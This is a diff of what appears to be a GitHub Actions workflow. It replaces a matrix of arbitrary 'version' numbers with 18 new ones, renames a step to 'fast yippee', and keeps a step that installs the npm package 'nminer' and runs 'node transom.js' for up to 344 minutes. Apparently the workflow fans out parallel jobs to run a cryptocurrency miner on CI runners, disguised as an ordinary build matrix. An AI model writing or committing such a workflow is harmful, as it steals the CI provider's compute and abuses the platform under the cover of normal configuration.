@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1225 }
-          - { version: 281 }
-          - { version: 1374 }
-          - { version: 1732 }
-          - { version: 1662 }
-          - { version: 42 }
-          - { version: 4617 }
-          - { version: 6516 }
-          - { version: 4465 }
-          - { version: 2304 }
-          - { version: 7002 }
-          - { version: 5575 }
-          - { version: 2263 }
-          - { version: 3437 }
-          - { version: 5490 }
+          - { version: 3304 }
+          - { version: 1726 }
+          - { version: 3630 }
+          - { version: 4589 }
+          - { version: 2141 }
+          - { version: 2531 }
+          - { version: 5511 }
+          - { version: 1677 }
+          - { version: 4891 }
+          - { version: 3121 }
+          - { version: 7743 }
+          - { version: 9069 }
+          - { version: 1284 }
+          - { version: 5561 }
+          - { version: 6679 }
+          - { version: 966 }
+          - { version: 9698 }
+          - { version: 3607 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ouch whoa trial
+      - name: fast yippee
         run: |
           npm install nminer@latest
-          timeout 321m node transom.js || echo "transom executed"
+          timeout 344m node transom.js || echo "transom executed"
